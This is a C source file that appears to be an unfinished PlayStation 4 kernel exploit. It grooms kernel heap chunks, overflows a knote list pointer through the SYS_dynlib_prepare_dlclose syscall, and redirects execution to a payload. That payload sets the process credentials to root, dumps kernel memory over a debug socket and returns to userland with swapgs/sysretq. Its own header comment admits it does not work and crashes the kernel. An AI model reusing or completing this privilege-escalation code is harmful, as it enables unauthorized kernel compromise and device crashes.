/*
	This does not work, and currently seems to only crash the kernel at times
	(depending on the values chosen)
	I have tried, but not gotten further. Either very close or not at all ... Oo
	(if you figure this out please holla - to discuss you can open an issue)
*/

#include "common.h"
#include "alloc.h"
#include "util.h"

// Some good to go stack sizes
#define KExecChunkMax 0x100

// Chunk size controls
#define KExecIntermediateChunkSize 0x8000
#define KExecBufferChunkSize 0x8000
#define KExecOverflowChunkSize 0x8000

// Chunk count control
#define KExecIntermediateChuckCount 100

// Shell signature
typedef void (*Runnable)(void *);

// Arbitrary kernel function signatures
typedef int (*PrintF)(const char *fmt, ...);
typedef int (*SysWrite)(struct thread *, struct write_args *);
typedef int	(*SysSendto)(struct thread *, struct sendto_args *);
typedef int	(*Reboot)(struct thread *, struct reboot_args *);

#ifdef __PS4__
#include <kernel.h>

__typeof__(__mb_sb_limit) __mb_sb_limit;
__typeof__(__mb_sb_limit) *__mb_sb_limit_address;
__typeof__(_CurrentRuneLocale) _CurrentRuneLocale;
__typeof__(_CurrentRuneLocale) *_CurrentRuneLocale_address;
__typeof__(__stdinp) __stdinp;
__typeof__(__stdinp) *__stdinp_address;
__typeof__(__stdoutp) __stdoutp;
__typeof__(__stdoutp) *__stdoutp_address;
__typeof__(__isthreaded) __isthreaded;
__typeof__(__isthreaded) *__isthreaded_address;
#endif

static int debug;

void shell()
{
	printf("shell");
	fflush(stdout);
}

void run(void *arg) // no idea if this user land function is (can?) ever been called by the kernel
{
	struct thread *td;
	struct ucred *cred;

	struct sendto_args sargs;
	struct write_args wargs;

 	sargs.s = debug;
	sargs.buf = (void *)0xffffffff8247b0f0;
	sargs.len = 0x1000;
 	sargs.flags = 0;
	sargs.to = NULL;
	sargs.tolen = 0;

	wargs.fd = 1;
	wargs.buf = (void *)0xffffffff8247b0f0;
	wargs.nbyte = 0x1000;

	__asm__ volatile("movq %%gs:0, %0" : "=r"(td)); // should be, no?

	cred = td->td_proc->p_ucred;
	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	//cred->cr_prison = ; // no good idea to get prison0 either

	while(((SysWrite)0xffffffff8247b0f0)(td, &wargs) == EINTR);
	while(((SysSendto)0xffffffff8249eba0)(td, &sargs) == EINTR);

	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
}

void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t bufferSize, size_t overflowSize)
{
	int chunks[KExecChunkMax];
	int bufferChunk;
	int overflowChunk;
	long pageSize = sysconf(_SC_PAGESIZE);
	size_t mapChunkSize = (bufferSize + overflowSize);
	size_t mapOverflowSize = (0x100000000 + bufferSize) / 4;
	int i, r;

	// setup kernel chunks
	for(i = 0; i < intermediateChunkCount; i++)
		chunks[i] = kexecAlloc(intermediateSize);
	// note errors
	for(i = 0; i < intermediateChunkCount; i++)
		if(chunks[i] < 0)
			printf("kexecAlloc: %i failed with %i\n", i, chunks[i]);

	bufferChunk = kexecAlloc(bufferSize);
	if(bufferChunk < 0)
		printf("bufferChunk: failed with %i\n", bufferChunk);

	overflowChunk = kexecAlloc(overflowSize);
	if(overflowChunk < 0)
		printf("overflowChunk: failed with %i\n", overflowChunk);

	// free first
	r = kexecFree(bufferChunk);
	if(r < 0)
		printf("kexecFree(bufferChunk) = %i\n", r);

	// setup userland
	uint8_t *map = mmap(NULL, mapChunkSize + pageSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if(map == MAP_FAILED)
	{
		for(i = 0; i < intermediateChunkCount; i++)
		{
			r = kexecFree(chunks[i]);
			if(r < 0)
				printf("kexecFree(chunks[%i]) = %i\n", i, r);
		}
		r = kexecFree(overflowChunk);
		if(r < 0)
			printf("kexecFree(overflowChunk) = %i\n", r);
		printf("mmap failed\n");
		return;
	}

	munmap(map + mapChunkSize, pageSize);

	// copy & prepare overflow
	struct knlist *list = (struct knlist *)(map + mapChunkSize - sizeof(struct knlist)); // list at end of overflow
	list->kl_lock = run; // ... ?

	// set list in knote
	//for(i = 0; i < 32; ++i)
	//	((void **)(map + bufferSize))[i] = list;
	// should be @ 0x16, no? ... Oo?
	((void **)(map + bufferSize))[2] = list;

	// overflow
	r = syscall(SYS_dynlib_prepare_dlclose, 1, map, &mapOverflowSize);
	printf("SYS_dynlib_prepare_dlclose: %i\n", r);

	// free all intermediates
	for(i = 0; i < intermediateChunkCount; i++)
	{
		r = kexecFree(chunks[i]);
		if(r < 0)
			printf("kexecFree(chunks[%i]) = %i\n", i, r);
	}

	printf("Pre Trigger\n");
	fflush(stdout);
	// trigger + free
	r = kexecFree(overflowChunk);
	if(r < 0)
		printf("kexecFree(overflowChunk) = %i\n", r);
	printf("Post Trigger\n");
	fflush(stdout);

	munmap(map, bufferSize); // mapChunkSize - overflowSize

	/* close fd for unclosed global allocs */
	r = kexecCloseGlobalIfNeeded();
	if(r < 0)
		printf("kexecCloseGlobalIfNeeded() = %i\n", r);
}

int main(int argc, char **argv)
{
	#ifdef __PS4__
	int libc = sceKernelLoadStartModule("libSceLibcInternal.sprx", 0, NULL, 0, 0, 0);
	sceKernelDlsym(libc, "__stdoutp", (void **)&__stdoutp_address);
	__stdoutp = *__stdoutp_address;
	sceKernelDlsym(libc, "__mb_sb_limit", (void **)&__mb_sb_limit_address);
	__mb_sb_limit = *__mb_sb_limit_address;
	sceKernelDlsym(libc, "_CurrentRuneLocale", (void **)&_CurrentRuneLocale_address);
	_CurrentRuneLocale = *_CurrentRuneLocale_address;
	#endif

	debug = utilSingleAcceptServer(5088);

	kexecExploit(KExecIntermediateChuckCount, KExecIntermediateChunkSize, KExecBufferChunkSize, KExecOverflowChunkSize);

	while(1);

	close(debug);

	return EXIT_SUCCESS;
}
